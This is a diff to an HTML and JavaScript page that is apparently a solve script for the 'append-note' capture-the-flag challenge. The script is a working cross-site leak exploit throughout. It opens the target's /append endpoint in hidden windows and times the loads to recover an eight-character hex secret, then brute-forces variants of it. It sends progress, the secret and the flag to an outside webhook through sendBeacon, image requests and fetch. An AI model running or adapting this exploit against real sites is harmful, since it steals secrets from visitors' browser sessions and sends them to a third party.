@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html>
-<head><title>XS-Leak Sequential</title></head>
+<head><title>XS-Leak</title></head>
 <body>
 <div id="s">Loading...</div>
 <script>
@@ -8,27 +8,31 @@ var TARGET = "https://append-note-298af.instancer.lac.tf";
 var WEBHOOK = "https://polite-eagle-84.webhook.cool";
 var CHARS = "0123456789abcdef";
 
+// Report using multiple methods
 function report(msg) {
-    navigator.sendBeacon(WEBHOOK, msg);
-    new Image().src = WEBHOOK + "?m=" + encodeURIComponent(msg);
+    try { navigator.sendBeacon(WEBHOOK, msg); } catch(e) {}
+    try { new Image().src = WEBHOOK + "?m=" + encodeURIComponent(msg); } catch(e) {}
+    try { fetch(WEBHOOK + "?f=" + encodeURIComponent(msg), {mode:'no-cors'}); } catch(e) {}
 }
 
-report("SEQ_V3");
+report("LOAD_V4");
 
+// Use link click instead of form submit 
 function testPrefix(prefix) {
     return new Promise(function(resolve) {
         var url = TARGET + "/append?content=" + encodeURIComponent(prefix) + "&url=" + encodeURIComponent(TARGET + "/");
         var wname = "w" + Math.random().toString(36).slice(2);
         
-        var form = document.createElement("form");
-        form.method = "GET";
-        form.action = url;
-        form.target = wname;
-        document.body.appendChild(form);
+        // Create link and click it
+        var a = document.createElement("a");
+        a.href = url;
+        a.target = wname;
+        a.style.display = "none";
+        document.body.appendChild(a);
         
         var t0 = performance.now();
-        form.submit();
-        document.body.removeChild(form);
+        a.click();
+        document.body.removeChild(a);
         
         setTimeout(function() {
             var elapsed = performance.now() - t0;
@@ -37,7 +41,7 @@ function testPrefix(prefix) {
                 if (w) w.close();
             } catch(e) {}
             resolve(elapsed);
-        }, 400);
+        }, 350);
     });
 }
 
@@ -47,7 +51,6 @@ async function trySecret(secret) {
         var text = await resp.text();
         if (text.indexOf("lactf") !== -1) {
             report("FLAG=" + text);
-            document.getElementById("s").textContent = text;
             return true;
         }
     } catch(e) {}
@@ -56,14 +59,12 @@ async function trySecret(secret) {
 
 async function main() {
     report("START");
-    document.getElementById("s").textContent = "Starting...";
     
     try {
         var secret = "";
         
         for (var pos = 0; pos < 8; pos++) {
-            document.getElementById("s").textContent = "P" + pos + ": " + secret;
-            report("POS" + pos);
+            report("P" + pos);
             
             var results = [];
             for (var i = 0; i < CHARS.length; i++) {
@@ -73,33 +74,37 @@ async function main() {
             }
             
             results.sort(function(a, b) { return a.time - b.time; });
-            
             var fast = results[0];
             var slow = results[results.length - 1];
             
-            report("P" + pos + ":F=" + fast.c + "(" + Math.round(fast.time) + ")S=" + slow.c + "(" + Math.round(slow.time) + ")");
-            
+            report("R" + pos + ":" + fast.c + "-" + slow.c);
             secret += fast.c;
         }
         
-        report("SECRET=" + secret);
+        report("S=" + secret);
         
-        if (await trySecret(secret)) return;
+        if (await trySecret(secret)) {
+            report("FOUND");
+            return;
+        }
         
-        report("BRUTE");
+        // Bruteforce
         for (var pos = 0; pos < 8; pos++) {
             for (var i = 0; i < CHARS.length; i++) {
                 var c = CHARS[i];
                 if (secret[pos] === c) continue;
-                var variant = secret.substr(0, pos) + c + secret.substr(pos + 1);
-                if (await trySecret(variant)) return;
+                var v = secret.substr(0, pos) + c + secret.substr(pos + 1);
+                if (await trySecret(v)) {
+                    report("BF=" + v);
+                    return;
+                }
             }
         }
         
         report("NOFLAG");
         
     } catch(e) {
-        report("ERR=" + e.message);
+        report("E=" + e.message);
     }
 }
 
